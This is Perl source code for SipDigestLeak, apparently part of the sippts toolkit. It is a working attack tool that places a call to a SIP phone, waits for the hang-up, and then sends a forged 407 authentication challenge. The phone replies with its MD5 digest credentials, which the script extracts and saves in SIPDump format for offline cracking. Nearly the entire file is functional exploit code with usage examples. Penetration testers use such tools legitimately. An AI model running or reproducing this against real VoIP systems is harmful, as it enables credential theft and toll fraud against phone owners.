#!/usr/bin/perl
# -=-=-=-=-=-=-
# SipDigestLeak
# -=-=-=-=-=-=-
#
# Pepelux <pepeluxx@gmail.com>
 
use warnings;
use strict;
use IO::Socket;
use IO::Socket::Timeout;
use NetAddr::IP;
use Getopt::Long;
use Digest::MD5 qw(md5 md5_hex md5_base64);
use Net::Address::IP::Local;

my $ipaddr = Net::Address::IP::Local->public;
my $useragent = 'pplsip';
my $version;

my $host = '';	# host
my $dport = ''; # destination port
my $from = '';	# from number
my $fromname = ''; # from name
my $to = ''; # to number
my $v = 0; # verbose mode
my $from_ip = '';
my $totag = "";
my $cseq = "1";
my $bye_branch = "";
my $sd = "";

my $versionfile = 'version';
open(my $fh, '<:encoding(UTF-8)', $versionfile)
  or die "Could not open file '$versionfile' $!";
 
while (my $row = <$fh>) {
  chomp $row;
  $version = $row;
}


sub init() {
	# check params
	my $result = GetOptions ("h=s" => \$host,
				"f=s" => \$from,
				"fn=s" => \$fromname,
				"t=s" => \$to,
				"ip=s" => \$from_ip,
				"ua=s" => \$useragent,
				"p=s" => \$dport,
				"sd=s" => \$sd,
				"v+" => \$v);

	help() if ($host eq "");
	check_version();

	$dport = "5060" if ($dport eq "");
	$from = "100" if ($from eq "");
	$to = "100" if ($to eq "");
	$from_ip = $ipaddr if ($from_ip eq "");

	my $callid = &generate_random_string(32, 1);
	my $sc = new IO::Socket::INET->new(PeerPort=>$dport, Proto=>'udp', PeerAddr=>$host, Timeout => 10);

	if ($sc) {
		IO::Socket::Timeout->enable_timeouts_on($sc);
		$sc->read_timeout(60);
		$sc->enable_timeout;
		my $lport = $sc->sockport();

		# send INVITE
		if ($v eq 0) { print "[+] Connecting to $host:$dport\n"; }
		my $res = send_invite($sc, $from_ip, $host, $lport, $dport, $from, $fromname, $to, $callid);

		# Call is attended. Wait the hung up
		if ($res =~ /^200/) { 
			send_ack($sc, $from_ip, $host, $lport, $dport, $from, $to, $callid);
			wait_bye($sc);
			send_error($sc, $from_ip, $host, $lport, $dport, $from, $to, $callid, $cseq);
		}
	}

	exit;
}


# Send INVITE message
sub send_invite {
	my $sc = shift;
	my $from_ip = shift;
	my $host = shift;
	my $lport = shift;
	my $dport = shift;
	my $from = shift;
	my $fromname = shift;
	my $to = shift;
	my $callid = shift;

	my $branch = &generate_random_string(71, 0);
	
	my $msg = "INVITE sip:".$to."@".$host.":".$dport." SIP/2.0\r\n";
	$msg .= "Via: SIP/2.0/UDP $from_ip:$lport;branch=$branch\r\n";
	$msg .= "From: $fromname <sip:".$from."@".$host.">;tag=0c26cd11\r\n";
	$msg .= "To: <sip:".$to."@".$host.">\r\n";
	$msg .= "Contact: <sip:".$from."@".$from_ip.":$lport;transport=udp>\r\n";
	$msg .= "Call-ID: ".$callid."\r\n";
	$msg .= "CSeq: 1 INVITE\r\n";
	$msg .= "User-Agent: $useragent\r\n";
	$msg .= "Max-Forwards: 70\r\n";
	$msg .= "Allow: INVITE,ACK,CANCEL,BYE,NOTIFY,REFER,OPTIONS,INFO,SUBSCRIBE,UPDATE,PRACK,MESSAGE\r\n";
	$msg .= "Content-Length: 0\r\n\r\n";

	print $sc $msg;

	if ($v eq 0) { print "[+] Sending INVITE $from => $to\n"; }
	else { print "Sending:\n=======\n$msg"; }

	my $data = "";
	my $response = "";
	my $line = "";

	LOOP: {
		while (<$sc>) {
			$line = $_;

			if ($line =~ /^SIP\/2.0/) {
				$line =~ /^SIP\/2.0\s(.+)\r\n/;
				if ($1) { $response = $1; }
			}
				
			if ($line =~ /^To/i && $line =~ /;tag/i) {
				$line =~ /;tag=(.+)\r\n/;
				$totag = $1 if ($1);
			}

			$data .= $line;

			if ($line =~ /^\r\n/) {
				if ($v eq 0) { print "[-] $response\n"; }
				else { print "Receiving:\n=========\n$data"; }

				last LOOP if ($response !~ /^1/);
				
				$data = "";
				$response = "";
			}
		}
	}

	return $response;
}


# Send ACK message
sub send_ack {
	my $sc = shift;
	my $from_ip = shift;
	my $host = shift;
	my $lport = shift;
	my $dport = shift;
	my $from = shift;
	my $to = shift;
	my $callid = shift;
	
	my $branch = &generate_random_string(71, 0);
	
	my $msg = "ACK sip:".$to."@".$host.":".$dport." SIP/2.0\r\n";
	$msg .= "Via: SIP/2.0/UDP $from_ip:$lport;branch=$branch\r\n";
	$msg .= "From: <sip:".$from."@".$host.">;tag=0c26cd11\r\n";
	$msg .= "To: <sip:".$to."@".$host.">;tag=$totag\r\n";
	$msg .= "Call-ID: ".$callid."\r\n";
	$msg .= "CSeq: 1 ACK\r\n";
	$msg .= "Contact: <sip:".$from."@".$from_ip.":$lport;transport=udp>\r\n";
	$msg .= "User-Agent: $useragent\r\n";
	$msg .= "Max-Forwards: 70\r\n";
	$msg .= "Allow: INVITE,ACK,CANCEL,BYE,NOTIFY,REFER,OPTIONS,INFO,SUBSCRIBE,UPDATE,PRACK,MESSAGE\r\n";
	$msg .= "Content-Length: 0\r\n\r\n";

	print $sc $msg;

	if ($v eq 0) { print "[+] Sending ACK\n"; }
	else { print "Sending:\n=======\n$msg"; }
}


# Wait BYE
sub wait_bye {
	my $sc = shift;

	my $data = "";
	my $response = "";
	my $line = "";
	my $bye = 0;

	if ($v eq 0) { print "[+] Waiting for the BYE message\n"; }

	LOOP: {
		while (<$sc>) {
			$line = $_;

			if ($line =~ /^SIP\/2.0/ || $line =~ /^BYE/i) {
				$line =~ /^SIP\/2.0\s(.+)\r\n/;
				if ($1) { $response = $1; }
				$bye = 1 if ($line =~ /^BYE/i);
			}
				
			if ($line =~ /CSeq/i) {
				$line =~ /CSeq\:\s(.+)\r\n/i;

				$cseq = $1 if ($1);
			}

			if ($line =~ /^Via/i && $line =~ /;branch/i) {
				$line =~ /;branch=(.+)\r\n/;
				$bye_branch = $1 if ($1);
			}

			$data .= $line;

			if ($line =~ /^\r\n/) {
				if ($v eq 0) { print "[-] BYE received\n"; }
				else { print "Receiving:\n=========\n$data"; }

				last LOOP if ($bye eq 1);

				$data = "";
				$response = "";
			}
		}
	}
}


# Send 407 response error
sub send_error {
	my $sc = shift;
	my $from_ip = shift;
	my $host = shift;
	my $lport = shift;
	my $dport = shift;
	my $from = shift;
	my $to = shift;
	my $callid = shift;
	my $csec = shift;
	
	my $branch = $bye_branch;
	my $realm = "asterisk";
	my $nonce = &generate_random_string(8, 0);
	my $digest = "WWW-Authenticate: Digest algorithm=MD5, realm=\"$realm\", nonce=\"$nonce\"";

	my $msg = "SIP/2.0 407 Proxy Authentication Required\r\n";
	$msg .= "Via: SIP/2.0/UDP $host:$dport;branch=$branch\r\n";
	$msg .= "From: <sip:".$to."@".$host.":".$dport.">;tag=".$totag."\r\n";
	$msg .= "To: <sip:".$from."@".$from_ip.":".$lport.">;tag=0c26cd11\r\n";
	$msg .= "Call-ID: ".$callid."\r\n";
	$msg .= "CSeq: $csec\r\n";
	$msg .= "$digest\r\n";
	$msg .= "Content-Length: 0\r\n\r\n";

	print $sc $msg;

	if ($v eq 0) { print "[+] Sending 407 Proxy Authentication Required\n"; }
	else { print "Sending:\n=======\n$msg"; }

	my $data = "";
	my $response = "";
	my $line = "";
	my $auth = "";
	my $resp = "";
	my $user = "";
	my $uri = "";

	LOOP: {
		while (<$sc>) {
			$line = $_;
			
			if ($line =~ /^SIP\/2.0/ && ($response eq "" || $response =~ /^1/)) {
				$line =~ /^SIP\/2.0\s(.+)\r\n/;
				if ($1) { $response = $1; }
			}
				
			if ($line =~ /Authorization/i) {
				$line =~ /Authorization\:\s(.+)\r\n/i;
				$auth = $1 if ($1);

				$auth =~ /username\=\"([a-z|A-Z|0-9|-|_]+)\"/i;
 				$user = $1 if ($1);

				$auth =~ /uri\=\"([a-z|A-Z|0-9|-|_|\.|\:|\;|\=|\@|\#]+)\"/i;
				$uri = $1 if ($1);

				$auth =~ /response\=\"(.+)\"/i;
				$resp = $1 if ($1);
			}

			$data .= $line;
 
			if ($line =~ /^\r\n/) {
				if ($v eq 0) { print "[-] Auth: $auth\n"; }
				else { print "Receiving:\n=========\n$data"; }

				if ($auth ne "" && $sd ne "") {
					my $res = "$host\"$from_ip\"$user\"$realm\"BYE\"$uri\"$nonce\"\"\"\"MD5\"$resp";
					open(my $fh, '>>', $sd) or die "Could not open file '$sd' $!";
					print $fh "$res\n";
					close $fh;
					print "Data saved in file: $sd\n";
				}

				last LOOP if ($response !~ /^1/);

				$data = "";
				$response = "";
			}
		}
	}
	
	return $response;
}

# Generate a random string
sub generate_random_string {
	my $length_of_randomstring = shift;
	my $only_hex = shift;
	my @chars;

	if ($only_hex == 0) {
		@chars = ('a'..'z','0'..'9');
	}
	else {
		@chars = ('a'..'f','0'..'9');
	}

	my $random_string;

	foreach (1..$length_of_randomstring) {
		$random_string.=$chars[rand @chars];
	}

	return $random_string;
}
 
sub check_version {
	my $v = `curl -s https://raw.githubusercontent.com/Pepelux/sippts/master/version`;
	$v =~ s/\n//g;

	if ($v ne $version) {	
		print "The current version ($version) is outdated. There is a new version ($v). Please update:\n";
		print "https://github.com/Pepelux/sippts\n";
	}
}

sub help {
    print qq{
SipDigestLeak - by Pepelux <pepeluxx\@gmail.com>
-------------

Usage: perl $0 -h <host> [options]
 
== Options ==
-f  <string>     = From user (default: 100)
-fn <string>     = From name (default blank)
-t  <string>     = To user (default: 100)
-p  <integer>    = Remote port (default: 5060)
-ip <string>     = Source IP (default: local IP address)
-ua <string>     = Customize the UserAgent
-sd <filename>   = Save data in a format SIPDump file
-v               = Verbose (trace information)
 
== Examples ==
\$ perl $0 -h 192.168.0.1
\$ perl $0 -h 192.168.0.1 -p 5080 -v
\$ perl $0 -h 192.168.0.1 -sd data.txt
\$ perl $0 -h 192.168.0.1 -f 666666666 -fn Devil
 
};
 
    exit 1;
}
 
init();
